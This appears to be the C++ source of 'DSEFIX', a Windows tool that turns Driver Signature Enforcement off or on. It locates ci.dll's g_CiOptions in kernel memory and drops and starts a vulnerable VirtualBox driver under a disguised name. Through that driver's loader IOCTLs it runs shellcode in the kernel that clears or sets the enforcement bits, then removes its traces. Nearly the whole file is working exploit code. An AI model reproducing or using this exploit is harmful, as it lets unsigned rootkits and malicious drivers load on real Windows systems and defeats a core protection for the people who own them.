#include "vs6.h"

#include <Psapi.h>
#include <stdio.h>
#pragma comment(lib, "Psapi.lib")

#include "hde/hde64.h"

#include "vbox.h"
#include "vboxdrv.h"

#ifdef _WIN64
#pragma comment(lib, "ntdll64.lib")
#else
#pragma comment(lib, "ntdll86.lib")
#endif
extern "C" DWORD WINAPI RtlGetVersion(PRTL_OSVERSIONINFOW lpVersionInformation);

DWORD64 GetKernelBase(LPCSTR szModule) {
	LPVOID DriverList[1024];
	DWORD cbNeeded;

	if (EnumDeviceDrivers(DriverList, sizeof(DriverList), &cbNeeded) == 0)
		return 0;

	int cDrivers = cbNeeded / sizeof(LPVOID);

	for (int i = 0; i < cDrivers; i++) {
		char szBaseName[MAX_PATH];
		if (!GetDeviceDriverBaseNameA(DriverList[i], szBaseName, sizeof(szBaseName)))
			continue;
		if (strcmpi(szModule, szBaseName) == 0)
			return (DWORD64)DriverList[i];
	}

	return 0;
}

DWORD64 GetCiOptionsOffset(HMODULE UserBase, DWORD dwBuildNumber) {
	hde64s hs;

	PBYTE CiInitialize = (PBYTE)GetProcAddress(UserBase, "CiInitialize");
	if (!CiInitialize)
		return 0;

	int c = 0, j = 0;
	for (c = 0; c < 0x100;) {
		if (dwBuildNumber > 16199) {
			//find second "call"
			if (CiInitialize[c] == 0xE8)
				j++;

			if (j > 1)
				break;
		}
		else {
			//find first "jmp"
			if (CiInitialize[c] == 0xE9)
				break;
		}

		hde64_disasm(CiInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			return 0;
		c += hs.len;
	}

	//need sign extend
	CiInitialize = CiInitialize + c + 5 + *(PINT32)(CiInitialize + c + 1);

	for (c = 0; c < 0x100;) {
		if (*(PWORD)(CiInitialize + c) == 0x0d89)
			break;
		hde64_disasm(CiInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			return 0;
		c += hs.len;
	}

	//need sign extend
	CiInitialize = CiInitialize + c + 6 + *(PINT32)(CiInitialize + c + 2);

	return (DWORD64)(CiInitialize - (PBYTE)UserBase);
}

DWORD64 GetCiOptionsAddress() {
	RTL_OSVERSIONINFOW Version = { 0 };
	Version.dwOSVersionInfoSize = sizeof(Version);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&Version);

	if (Version.dwMajorVersion < 6)
		return 0;

	DWORD64 KernelBase = GetKernelBase("ci.dll");
	if (KernelBase == 0)
		return 0;

	HMODULE UserBase = LoadLibraryExA("ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (UserBase == 0)
		return 0;

	DWORD64 Offset = GetCiOptionsOffset(UserBase, Version.dwBuildNumber);
	FreeLibrary(UserBase);

	if (Offset == 0)
		return 0;

	return KernelBase + Offset;
}

/*
**  Disable DSE (W8 and above)
**  mov eax,[g_CiAddress]
**  and al,~6
**  ret
*/
unsigned char scDisable[] = {
	0xA1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0xF9, 0xC3
};

/*
**  Enable DSE (W8 and above)
**  mov eax,[g_CiAddress]
**  or al,6
**  ret
*/
unsigned char scEnable[] = {
	0xA1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x06, 0xC3
};

class DSEFIX {
private:
	SC_HANDLE schSCManager;
	HANDLE hDevice;

	char szFilePath[0x200];
	char szServiceName[0x200];

public:

	BOOL DropFile(LPCSTR szFileName, LPCVOID pData, DWORD Size) {
		//if (!GetSystemDirectoryA(szFilePath, MAX_PATH))
		//	return FALSE;
		if (!GetCurrentDirectoryA(MAX_PATH, szFilePath))
			return FALSE;

		strcat(szFilePath, "\\");
		strcat(szFilePath, szFileName);

		DeleteFileA(szFilePath);
		HANDLE hFile = CreateFileA(szFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			return FALSE;

		DWORD dwWrite;
		WriteFile(hFile, pData, Size, &dwWrite, NULL);
		CloseHandle(hFile);

		return dwWrite == Size;
	}

	void CleanFile() {
		DeleteFileA(szFilePath);
	}

	HANDLE StartDriver(LPCSTR szServiceName, LPCSTR szSymbolicLink) {
		if (schSCManager == NULL)
			return 0;

		StopDriver();

		SC_HANDLE schService = CreateServiceA(schSCManager, // SCManager database
			szServiceName,         // name of service
			szServiceName,         // name to display
			SERVICE_ALL_ACCESS,    // desired access
			SERVICE_KERNEL_DRIVER, // service type
			SERVICE_DEMAND_START,  // start type
			SERVICE_ERROR_NORMAL,  // error control type
			szFilePath,            // service's binary
			NULL,                  // no load ordering group
			NULL,                  // no tag identifier
			NULL,                  // no dependencies
			NULL,                  // LocalSystem account
			NULL                   // no password
		);
		if (schService) {
			BOOL ret = StartService(schService, 0, NULL);
			DWORD err = GetLastError();

			if (ret || (err == ERROR_SERVICE_ALREADY_RUNNING)) {
				hDevice = CreateFile(
					szSymbolicLink,
					GENERIC_READ | GENERIC_WRITE,
					0,
					NULL,
					OPEN_EXISTING,
					FILE_ATTRIBUTE_NORMAL,
					NULL
				);
			}
		}
		CloseServiceHandle(schService);

		strcpy(this->szServiceName, szServiceName);
		return hDevice;
	}

	void StopDriver()
	{
		if (hDevice != INVALID_HANDLE_VALUE)
			CloseHandle(hDevice);

		hDevice = INVALID_HANDLE_VALUE;

		if (schSCManager == NULL)
			return;

		SC_HANDLE schService;
		schService = OpenServiceA(schSCManager, szServiceName, SERVICE_ALL_ACCESS);
		if (schService)
		{
			for (int i = 0; i < 5; i++) {
				SERVICE_STATUS serviceStatus;
				BOOL ret = ControlService(schService, SERVICE_CONTROL_STOP, &serviceStatus);
				if (ret != FALSE)
					break;

				if (GetLastError() != ERROR_DEPENDENT_SERVICES_RUNNING)
					break;

				Sleep(1);
			}

			DeleteService(schService);
		}
		CloseServiceHandle(schService);
	}

	DSEFIX() {
		hDevice = INVALID_HANDLE_VALUE;

		schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (schSCManager == NULL) {
#ifdef _DEBUG
			MessageBoxA(0, "Run as administrator.", 0, MB_ICONERROR);
#endif
			ExitProcess(0);
		}
	}

	~DSEFIX() {
		CloseServiceHandle(schSCManager);
	}

	void RunExploit(bool bEnable, DWORD64 CiOptionsAddress) {
		if (hDevice == INVALID_HANDLE_VALUE)
			return;

		PBYTE Shellcode;
		DWORD CodeSize;

		if (bEnable) {
			Shellcode = scEnable;
			CodeSize = sizeof(scEnable);
			*(PDWORD64)(Shellcode + 1) = CiOptionsAddress;
		}
		else {
			Shellcode = scDisable;
			CodeSize = sizeof(scDisable);
			*(PDWORD64)(Shellcode + 1) = CiOptionsAddress;
		}

		SUPCOOKIE Cookie;
		RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
		Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
		Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
		Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
		Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		Cookie.Hdr.rc = 0;
		Cookie.u.In.u32ReqVersion = 0;
		Cookie.u.In.u32MinVersion = 0x00070002;
		RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

		DWORD bytesIO;

		if (!DeviceIoControl(hDevice, SUP_IOCTL_COOKIE,
			&Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
			SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
			return;

		SUPLDROPEN OpenLdr;
		DWORD BufferSize = CodeSize + 0x1000;

		RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
		OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
		OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
		OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		OpenLdr.Hdr.rc = 0;
		OpenLdr.u.In.cbImage = BufferSize;
		RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

		if (!DeviceIoControl(hDevice, SUP_IOCTL_LDR_OPEN, &OpenLdr,
			SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
			SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
			return;

		RTR0PTR ImageBase = OpenLdr.u.Out.pvImageBase;
		SIZE_T memIO = BufferSize;

		BYTE LoadTask[0x1000] = { 0 };
		PSUPLDRLOAD pLoadTask = (PSUPLDRLOAD)LoadTask;

		pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		pLoadTask->Hdr.cbIn = (ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + BufferSize;
		pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
		pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
		pLoadTask->Hdr.rc = 0;
		pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
		pLoadTask->u.In.pvImageBase = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
		RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, BufferSize - 0x1000);
		pLoadTask->u.In.cbImage = BufferSize;

		if (!DeviceIoControl(hDevice, SUP_IOCTL_LDR_LOAD,
			pLoadTask, pLoadTask->Hdr.cbIn,
			pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
			return;

		SUPSETVMFORFAST vmFast;
		RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
		vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		vmFast.Hdr.rc = 0;
		vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
		vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
		vmFast.u.In.pVMR0 = (UINT64)supImageHandle;

		if (!DeviceIoControl(hDevice, SUP_IOCTL_SET_VM_FOR_FAST,
			&vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
			&vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
			return;

#ifdef _DEBUG
		char buf[0x100];
		sprintf(buf, "Address : %I64X Enable : %d", CiOptionsAddress, bEnable);
		MessageBoxA(0, buf, 0, 0);
#endif

		DeviceIoControl(hDevice, SUP_IOCTL_FAST_DO_NOP,
			(LPVOID)CiOptionsAddress, 0,
			(LPVOID)CiOptionsAddress, 0,
			&bytesIO, NULL);


		SUPLDRFREE      ldrFree;
		RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
		ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
		ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
		ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		ldrFree.Hdr.rc = 0;
		ldrFree.u.In.pvImageBase = ImageBase;

		DeviceIoControl(hDevice, SUP_IOCTL_LDR_FREE,
			&ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
			&ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);
	}
};



#ifndef _DEBUG
int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd) {
	bool bEnable = strlen(lpCmdLine) > 0;
#else
int main(int argc, char *argv[]) {
	bool bEnable = argc > 1;
#endif

	DSEFIX dsefix;
	DWORD64 CiOptionsAddress = GetCiOptionsAddress();
	if (CiOptionsAddress == 0)
		return 0;

	dsefix.DropFile("VBoxDrv_384821.sys", ::VBoxDrv, sizeof(::VBoxDrv));
	dsefix.StartDriver("VBoxDrv_948573", ::VBoxSymLink);
	dsefix.RunExploit(bEnable, CiOptionsAddress);
	dsefix.StopDriver();
	dsefix.CleanFile();

	return 0;
}